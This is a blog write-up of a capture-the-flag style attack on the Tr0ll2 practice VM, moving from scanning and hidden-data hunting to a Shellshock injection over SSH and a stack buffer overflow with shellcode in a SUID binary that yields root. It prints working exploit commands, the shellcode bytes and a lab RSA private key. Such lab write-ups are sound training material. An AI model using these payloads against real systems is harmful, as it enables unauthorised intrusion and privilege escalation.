---
author: recrudesce
comments: false
date: 2014-10-26 14:36:45+00:00
layout: post
slug: please-do-not-feed-the-trolls
title: Please do not feed the trolls.
wordpress_id: 263
categories:
- VM's
tags:
- boot2root
- hacking
- Infosec
- nmap
- Pentesting
- tr0ll
- tr0ll2
- vm
- vulnhub
---

[Maleus](https://twitter.com/Maleus21) released [Tr0ll](http://vulnhub.com/entry/tr0ll-1,100/) a while ago, and while I didn't attempt it, I figured I'd do the follow up - [Tr0ll2](http://vulnhub.com/entry/tr0ll-2,107/). So, here is a quick runthrough of how to pwn it.

I would put this VM at beginner level - it's not particularly complicated. It's more a case of finding hidden data than actually doing any vulnerability exploitation. Lets get started.
<!-- more -->

![](http://www.zerodayclothing.com/products/designs/trinity_design.png)

And so should you.


``` bash
root@pwk:~# nmap -sS -T5 -p- --script banner 172.16.56.138

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-23 15:27 BST
Nmap scan report for 172.16.56.138
Host is up (0.00020s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
|_banner: 220 Welcome to Tr0ll FTP... Only noobs stay for a while...
22/tcp open  ssh
|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4
80/tcp open  http
MAC Address: 00:0C:29:14:2B:52 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds
root@pwk:~#
```

FTP, SSH and HTTP. Lets hit the HTTP server first, as that's where Tr0ll started.

[![tr0ll2_001](http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_001.png)

So, the usual then. A quick Nikto scan shows that there's a robots.txt file, which has the following in it

``` text
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

Using this as a wordlist for dirb shows that only 4 of these directories actually result in an HTTP response other than 404.

``` bash
root@pwk:~# dirb http://172.16.56.138 troll_url.txt 

-----------------
DIRB v2.21
By The Dark Raver
-----------------

START_TIME: Thu Oct 23 15:31:32 2014
URL_BASE: http://172.16.56.138/
WORDLIST_FILES: troll_url.txt

-----------------

GENERATED WORDS: 21                                                            

---- Scanning URL: http://172.16.56.138/ ----
==> DIRECTORY: http://172.16.56.138/noob/
==> DIRECTORY: http://172.16.56.138/keep_trying/
==> DIRECTORY: http://172.16.56.138/dont_bother/
==> DIRECTORY: http://172.16.56.138/ok_this_is_it/                                                                                                      

---- Entering directory: http://172.16.56.138/noob/ ----

---- Entering directory: http://172.16.56.138/keep_trying/ ----

---- Entering directory: http://172.16.56.138/dont_bother/ ----

---- Entering directory: http://172.16.56.138/ok_this_is_it/ ----

-----------------
DOWNLOADED: 105 - FOUND: 0
root@pwk:~/troll#
```

Visiting these URL's provide the following page
[![tr0ll2_002](http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png)](http://fourfourfourfour.co/wp-content/uploads/2014/10/tr0ll2_002.png)

While it looks like the page is identical for each of the 4 directories, on closer inspection, one of the images shown is slightly larger than the rest - this was determined by downloading each image.

``` bash
-rw-r--r-- 1 root root   15831 Oct  4 09:57 cat_the_troll.jpg
-rw-r--r-- 1 root root   15873 Oct  4 09:31 cat_the_troll.jpg.1
```

Running strings (NOOOO !!!!) on this file results in the following output

``` bash
Look Deep within y0ur_self for the answer
root@pwk:~#
```

Which just so happens to be a folder on the webserver, containing an answer.txt file. Short story shorter, answer.txt is just a dictionary file but with each individual line base64 encoded.
On visual inspection, one line stands out... (yes, I could probably have written something, but scrolling through a large file and noticing strange anomalies is my bag, ok ?)

``` text
SXNzYWNoYXIK
SXN0YW5idWwK
SXN0YW5idWwK
SXN1enUK
SXN1enUK
SXQK
SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg==
SXRhaXB1Cg==
SXRhaXB1Cg==
SXRhbGlhbgo=
SXRhbGlhbgo=
SXRhbGlhbnMK
SXRhbHkK
```

Decoded, we get

``` bash
root@pwk:~# echo SXRDYW50UmVhbGx5QmVUaGlzRWFzeVJpZ2h0TE9MCg== | base64 -d
ItCantReallyBeThisEasyRightLOL
```

![](http://i780.photobucket.com/albums/yy82/dguy210/facepalm-star-trek-o_zps1270c857.gif)

So, we've exhausted the HTTP server by this point, so lets move onto FTP. I won't bore you with details, but the username and password combo is Tr0ll:Tr0ll. The only file residing on the FTP server is a ZIP file.

``` bash
root@pwk:~# ftp 172.16.56.138
Connected to 172.16.56.138.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (172.16.56.138:root): Tr0ll
331 Please specify the password.
Password: Tr0ll
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -l
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.
ftp>
```

On extracting the ZIP file, we are asked for a password... lets try "ItCantReallyBeThisEasyRightLOL"

``` bash
root@pwk:~# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: ItCantReallyBeThisEasyRightLOL
  inflating: noob
```
which turns out to be an RSA private key - this is our route in via SSH.

``` text
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```

It is possible to SSH into the VM using the noob user, as per the key's filename, but we are immediately disconnected.

``` bash
root@pwk:~# ssh -i key.key noob@172.16.56.138
TRY HARDER LOL!
Connection to 172.16.56.138 closed.
root@pwk:~#
```

Standard things here like --norc don't work, so lets try something new. SHELLSHOCK !

``` bash
root@pwk:~# ssh -i key.key noob@172.16.56.138 '() { :;}; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
maleus:x:1000:1000:Tr0ll,,,:/home/maleus:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:104:111:ftp daemon,,,:/srv/ftp:/bin/false
noob:x:1002:1002::/home/noob:/bin/bash
Tr0ll:x:1001:1001::/home/tr0ll:/bin/false
root@pwk:~#
```

Yup, we can get a shell with this using '() { :;}; /bin/bash'

``` bash
root@pwk:~# ssh -i key.key noob@172.16.56.138 '() { :;}; /bin/bash'
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
```

A small bit of enumeration here identifies the following folder structure

``` bash
pwd
/nothing_to_see_here/choose_wisely
ls -l
total 12
drwsr-xr-x 2 root root 4096 Oct  5 21:16 door1
drwsr-xr-x 2 root root 4096 Oct  5 21:19 door2
drwsr-xr-x 2 root root 4096 Oct  5 21:17 door3
```

Each door folder includes a file called r00t, which is a binary. However, there are 3 different versions. One of them puts you into an rbash shell for 2 minutes, one of them kicks you out and reboots the VM, and the other one (the largest one) repeats anything you provide it via stdin. These files are SUID, so, looks like we have a standard buffer overflow here.

``` bash
-rwsr-xr-x 1 root root 7273 Oct  5 21:16 r00t
-rwsr-xr-x 1 root root 8401 Oct  5 21:16 r00t
-rwsr-xr-x 1 root root 7271 Oct  5 21:17 r00t
```

Something to note here before we carry on - a scheduled script rotates these files, so make sure you always work on the file that is 8401 bytes large - you may have to change into a different door directory.

Loading the file in GDB shows that you can easily overflow it with about 300 bytes of input.

``` bash
root@pwk:~# gdb ./r00t
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /root/troll/r00t...done.
gdb-peda$ r $(python -c 'print "A"*300');

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x12c
EBX: 0xb7fbeff4 --> 0x15ed7c
ECX: 0xbffff4d8 --> 0xb7fbf4e0 --> 0xfbad2a84
EDX: 0xb7fc0360 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff610 ('A' <repeats 28 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff610 ('A' <repeats 28 times>)
0004| 0xbffff614 ('A' <repeats 24 times>)
0008| 0xbffff618 ('A' <repeats 20 times>)
0012| 0xbffff61c ('A' <repeats 16 times>)
0016| 0xbffff620 ('A' <repeats 12 times>)
0020| 0xbffff624 ("AAAAAAAA")
0024| 0xbffff628 ("AAAA")
0028| 0xbffff62c --> 0x8048200 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
```

Standard buffer overflow process here (I don't want to teach you how to suck eggs tbh, there's enough resources online). EIP is at 269, so...

``` bash
gdb-peda$ r $(python -c 'print "A"*268 + "BBBB"');

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x110
EBX: 0xb7fbeff4 --> 0x15ed7c
ECX: 0xbffff4f8 --> 0xb7fbf4e0 --> 0xfbad2a84
EDX: 0xb7fc0360 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xbffff630 --> 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xbffff630 --> 0x0
0004| 0xbffff634 --> 0xbffff6d4 --> 0xbffff7f8 ("/root/troll/r00t")
0008| 0xbffff638 --> 0xbffff6e0 --> 0xbffff91a ("SHELL=/bin/bash")
0012| 0xbffff63c --> 0xb7fe0860 --> 0xb7e60000 --> 0x464c457f
0016| 0xbffff640 --> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
0020| 0xbffff644 --> 0xffffffff
0024| 0xbffff648 --> 0xb7ffeff4 --> 0x1cf2c
0028| 0xbffff64c --> 0x8048278 ("__libc_start_main")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$
```

OK, easy peasy. GDB identifies that there isn't a jmp esp in the binary, but it is a dynamically linked binary, so ret2libc is possible. But why make it more complicated for ourselves ? Naaah. Our shellcode can be placed in an environment value

``` bash
export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
```

Which can be located within GDB

``` bash
gdb ./r00t
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
(gdb) break main
Breakpoint 1 at 0x8048450: file bof.c, line 7.
(gdb) run
Starting program: /nothing_to_see_here/choose_wisely/door1/r00t 

Breakpoint 1, main (argc=1, argv=0xbffffcb4) at bof.c:7
(gdb) 7	bof.c: No such file or directory.
x/100xw $esp
0xbffffb00:	0x00000000	0x00000000	0x00000001	0x000008b0
0xbffffb10:	0x40024b48	0x40024858	0x08048278	0x40037158
0xbffffb20:	0x0804821c	0x00000001	0x400c2230	0x400c245e
0xbffffb30:	0xbffffb68	0x40020ff4	0x40021ad0	0xbffffc54
0xbffffb40:	0xbffffc10	0x40009ed9	0xbffffbf0	0x0804821c
0xbffffb50:	0xbffffbd8	0x40021a74	0x00000000	0x40024b48
0xbffffb60:	0x00000001	0x00000000	0x00000001	0x40021918
0xbffffb70:	0x00000000	0x00000000	0x00000000	0x401cfff4
0xbffffb80:	0xbffffbce	0xbffffbcf	0x00000001	0x400c27b9
0xbffffb90:	0xbffffbcf	0xbffffbce	0x00000000	0x40015fec
0xbffffba0:	0xbffffc54	0x40022000	0x00000000	0x4005cc73
0xbffffbb0:	0x08048278	0x00000000	0x00c10000	0x00000001
0xbffffbc0:	0xbffffdc2	0x0000002f	0xbffffc1c	0x401cfff4
0xbffffbd0:	0x080484b0	0x08049ff4	0x00000001	0x0804831d
0xbffffbe0:	0x401d03e4	0x0000000d	0x08049ff4	0x080484d1
0xbffffbf0:	0xffffffff	0x4005cdc6	0x401cfff4	0x4005ce55
0xbffffc00:	0x4000f280	0x00000000	0x080484b9	0x401cfff4
0xbffffc10:	0x080484b0	0x00000000	0x00000000	0x400434d3
0xbffffc20:	0x00000001	0xbffffcb4	0xbffffcbc	0x40024858
0xbffffc30:	0x00000000	0xbffffc1c	0xbffffcbc	0x00000000
0xbffffc40:	0x0804823c	0x401cfff4	0x00000000	0x00000000
0xbffffc50:	0x00000000	0xdd889bc6	0x2a19fe39	0x00000000
0xbffffc60:	0x00000000	0x00000000	0x00000001	0x08048390
0xbffffc70:	0x00000000	0x400146b0	0x400433e9	0x40020ff4
0xbffffc80:	0x00000001	0x08048390	0x00000000	0x080483b1
(gdb)
0xbffffc90:	0x08048444	0x00000001	0xbffffcb4	0x080484b0
0xbffffca0:	0x08048520	0x4000f280	0xbffffcac	0x40021918
0xbffffcb0:	0x00000001	0xbffffdc2	0x00000000	0xbffffdf0
0xbffffcc0:	0xbffffe77	0xbffffe87	0xbffffea9	0xbffffeb3
0xbffffcd0:	0xbffffebe	0xbffffed2	0xbfffff1f	0xbfffff2e
0xbffffce0:	0xbfffff5b	0xbfffff6c	0xbfffff75	0xbfffff85
0xbffffcf0:	0xbfffff8d	0xbfffff9a	0x00000000	0x00000020
0xbffffd00:	0x40022414	0x00000021	0x40022000	0x00000010
0xbffffd10:	0x0fabfbff	0x00000006	0x00001000	0x00000011
0xbffffd20:	0x00000064	0x00000003	0x08048034	0x00000004
0xbffffd30:	0x00000020	0x00000005	0x00000009	0x00000007
0xbffffd40:	0x40000000	0x00000008	0x00000000	0x00000009
0xbffffd50:	0x08048390	0x0000000b	0x000003ea	0x0000000c
0xbffffd60:	0x000003ea	0x0000000d	0x000003ea	0x0000000e
0xbffffd70:	0x000003ea	0x00000017	0x00000001	0x00000019
0xbffffd80:	0xbffffdab	0x0000001f	0xbfffffce	0x0000000f
0xbffffd90:	0xbffffdbb	0x00000000	0x00000000	0x00000000
0xbffffda0:	0x00000000	0x00000000	0xf6000000	0x6d8240c1
0xbffffdb0:	0xc85c9138	0x1f1bbf89	0x692ef87a	0x00363836
0xbffffdc0:	0x6e2f0000	0x6968746f	0x745f676e	0x65735f6f
0xbffffdd0:	0x65685f65	0x632f6572	0x736f6f68	0x69775f65
0xbffffde0:	0x796c6573	0x6f6f642f	0x722f3172	0x00743030
0xbffffdf0:	0x4c454853	0x444f434c	0x90903d45	0x90909090
0xbffffe00:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffe10:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb)
```

Shellcode starts around 0xbffffe10, so we just change our EIP to that memory location to run the shellcode. As proven within GDB, it runs as expected and /bin/dash is executed (GDB strips EUID though)

``` bash
(gdb) r $(python -c 'print "A"*268 + "\x10\xfe\xff\xbf"')
Starting program: /nothing_to_see_here/choose_wisely/door1/r00t $(python -c 'print "A"*268 + "\x10\xfe\xff\xbf"')
process 1575 is executing new program: /bin/dash
id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
exit
[Inferior 1 (process 1575) exited with code 0177]
(gdb)
```

When run outside of GDB, we get dropped to a root shell

``` bash
./r00t $(python -c 'print "A"*268 + "\x10\xfe\xff\xbf"')
id
uid=1002(noob) gid=1002(noob) euid=0(root) groups=0(root),1002(noob)
cd /root
ls -ls
total 40
4 -rw-r--r-- 1 root   root     68 Oct  6 18:32 Proof.txt
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:35 core1
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core2
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core3
4 drwxr-xr-x 5 root   root   4096 Oct  4 22:36 core4
4 drwxr-xr-x 2 root   root   4096 Oct  5 21:14 goal
4 drwxr-xr-x 2 root   root   4096 Oct  6 18:36 hardmode
4 -rw-r--r-- 1 maleus maleus 1474 Oct  4 00:28 lmao.zip
4 -rw-r--r-- 1 root   root    828 Oct  4 22:43 ran_dir.py
4 drwxr-xr-x 2 root   root   4096 Oct  6 18:35 reboot
cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
```

![](http://cdn-media-2.lifehack.org/wp-content/files/2014/08/Getting-it-done-gif.gif)
